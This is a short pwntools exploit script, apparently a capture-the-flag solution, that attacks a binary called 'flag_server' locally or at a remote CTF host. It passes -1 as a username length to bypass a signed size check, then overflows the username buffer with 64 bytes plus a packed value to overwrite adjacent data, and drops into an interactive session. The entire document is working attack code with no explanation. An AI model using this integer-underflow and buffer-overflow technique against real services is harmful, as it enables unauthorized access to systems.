from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv


# context(os='linux', arch='amd64', log_level='debug')
context(os='linux', arch='i386', log_level='debug')
binary = './flag_server'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',28515) if argv[1]=='r' else process(binary)

def int2bytes(content):
    return bytes(str(content), encoding='utf-8')


payload = int2bytes(-1)
p.sendlineafter(b'your username length: ',payload)
payload = b'a'*64 + p64(1)
p.sendlineafter(b'whats your username?',payload)
p.interactive()